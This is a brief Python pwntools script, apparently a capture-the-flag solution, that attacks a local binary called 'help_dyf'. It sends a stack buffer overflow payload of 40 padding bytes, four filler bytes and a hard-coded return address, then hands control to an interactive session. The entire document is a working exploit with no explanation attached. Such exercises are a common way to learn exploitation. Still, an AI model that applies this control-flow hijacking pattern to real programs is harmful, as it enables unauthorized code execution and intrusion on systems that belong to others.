from pwn import *

sh = process('./help_dyf')

payload = 'a' * 40 + 'bbbb' + p32(0x08049182)

sh.sendline(payload)

sh.interactive()
